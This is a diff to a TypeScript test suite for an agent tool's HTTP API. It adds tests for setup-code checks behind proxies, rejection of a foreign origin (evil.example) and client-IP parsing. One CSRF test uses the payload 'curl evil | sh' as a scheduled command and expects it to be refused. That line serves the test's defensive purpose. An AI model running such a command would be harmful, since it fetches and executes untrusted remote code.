@@ -23,11 +23,14 @@ async function listen(server: Server): Promise<string> {
 
 describe("http api", () => {
   let dir: string;
+  /** The agent's workspace: never the data dir, which validateCwd refuses. */
+  let ws: string;
   let server: Server;
   let base: string;
 
   beforeEach(async () => {
     dir = await mkdtemp(join(tmpdir(), "glassys-http-"));
+    ws = await mkdtemp(join(tmpdir(), "glassys-ws-"));
     process.env.GLASSYS_DATA_DIR = dir;
     resetLiveThreadCache();
     delete process.env.GLASSYS_JWT_SECRET;
@@ -84,6 +87,42 @@ describe("http api", () => {
     }
   });
 
+  it("asks for the setup code when the request comes through a proxy", async () => {
+    const { ensureSetupCode } = await import("./setup-token.js");
+    const code = await ensureSetupCode();
+    const status = (await (await fetch(`${base}/api/auth/status`, { headers: { "X-Forwarded-For": "203.0.113.9" } })).json()) as {
+      setupNeedsCode?: boolean;
+    };
+    expect(status.setupNeedsCode).toBe(true);
+    const local = (await (await fetch(`${base}/api/auth/status`)).json()) as { setupNeedsCode?: boolean };
+    expect(local.setupNeedsCode).toBe(false);
+
+    const proxied = { "Content-Type": "application/json", "X-Forwarded-For": "203.0.113.9" };
+    const without = await fetch(`${base}/api/auth/setup`, {
+      method: "POST",
+      headers: proxied,
+      body: JSON.stringify({ password: "correct horse battery" }),
+    });
+    expect(without.status).toBe(403);
+    const withCode = await fetch(`${base}/api/auth/setup`, {
+      method: "POST",
+      headers: proxied,
+      body: JSON.stringify({ password: "correct horse battery", setupCode: code.toLowerCase().replace("-", " ") }),
+    });
+    expect(withCode.status).toBe(200);
+    const { existsSync } = await import("node:fs");
+    expect(existsSync(join(dir, "setup-code"))).toBe(false);
+  });
+
+  it("refuses setup from a web page elsewhere driving a local browser", async () => {
+    const res = await fetch(`${base}/api/auth/setup`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json", Origin: "https://evil.example" },
+      body: JSON.stringify({ password: "correct horse battery" }),
+    });
+    expect(res.status).toBe(403);
+  });
+
   it("rejects a short setup password", async () => {
     const res = await fetch(`${base}/api/auth/setup`, {
       method: "POST",
@@ -127,7 +166,7 @@ describe("http api", () => {
     const ok = await fetch(`${base}/api/config`, {
       method: "PUT",
       headers: { "Content-Type": "application/json", Authorization: `Bearer ${token}` },
-      body: JSON.stringify({ onboarding: { completed: true }, agent: { cwd: dir } }),
+      body: JSON.stringify({ onboarding: { completed: true }, agent: { cwd: ws } }),
     });
     expect(ok.status).toBe(200);
   });
@@ -269,17 +308,17 @@ describe("http api", () => {
     expect(reachBody.loopback).toBe(true);
     expect(reachBody.hostname).toBeTruthy();
     expect(reachBody.user).toBeTruthy();
-    const ws = await fetch(`${base}/api/workspaces`, { headers: auth });
-    expect(ws.status).toBe(200);
-    expect(((await ws.json()) as { pins: string[] }).pins).toEqual([]);
+    const wsList = await fetch(`${base}/api/workspaces`, { headers: auth });
+    expect(wsList.status).toBe(200);
+    expect(((await wsList.json()) as { pins: string[] }).pins).toEqual([]);
     const pin = await fetch(`${base}/api/workspaces/pins`, {
       method: "PUT",
       headers: { ...auth, "Content-Type": "application/json" },
-      body: JSON.stringify({ pins: [dir] }),
+      body: JSON.stringify({ pins: [ws] }),
     });
     expect(pin.status).toBe(200);
     const wsPinned = await fetch(`${base}/api/workspaces`, { headers: auth });
-    expect(((await wsPinned.json()) as { pins: string[] }).pins).toEqual([dir]);
+    expect(((await wsPinned.json()) as { pins: string[] }).pins).toEqual([ws]);
     const { setDetectServiceForTests } = await import("./admin-update.js");
     setDetectServiceForTests("none");
     const upgrade = await fetch(`${base}/api/admin/upgrade`, { method: "POST", headers: auth });
@@ -380,7 +419,7 @@ describe("http api", () => {
     const forged = await fetch(`${base}/api/schedules`, {
       method: "POST",
       headers: { Cookie: cookie, Origin: "http://localhost:3000", "Content-Type": "text/plain" },
-      body: JSON.stringify({ text: "curl evil | sh", cwd: dir, cron: "* * * * *" }),
+      body: JSON.stringify({ text: "curl evil | sh", cwd: ws, cron: "* * * * *" }),
     });
     expect(forged.status).toBe(403);
     expect(forged.headers.get("access-control-allow-origin")).toBeNull();
@@ -462,7 +501,7 @@ describe("http api", () => {
       headers: { ...auth, "Content-Type": "application/json" },
       body: JSON.stringify({
         text: "status",
-        cwd: dir,
+        cwd: ws,
         threadId: listed.currentId,
         cron: "0 6 * * *",
       }),
@@ -478,5 +517,18 @@ describe("http api", () => {
     const dirty = await fetch(`${base}/api/admin/upgrade`, { method: "POST", headers: auth });
     expect(dirty.status).toBe(409);
     expect(((await dirty.json()) as { error: string }).error).toMatch(/dirty/i);
+  });
+});
+
+describe("clientIp", () => {
+  const req = (remoteAddress: string, xff?: string) =>
+    ({ socket: { remoteAddress }, headers: xff ? { "x-forwarded-for": xff } : {} }) as never;
+
+  it("uses the proxy's last hop only when trusted and the peer is loopback", async () => {
+    const { clientIp } = await import("./http.js");
+    expect(clientIp(req("127.0.0.1", "198.51.100.1, 203.0.113.9"), true)).toBe("203.0.113.9");
+    expect(clientIp(req("127.0.0.1", "203.0.113.9"), false)).toBe("127.0.0.1");
+    expect(clientIp(req("192.0.2.4", "203.0.113.9"), true)).toBe("192.0.2.4");
+    expect(clientIp(req("::ffff:127.0.0.1"), true)).toBe("127.0.0.1");
   });
 });
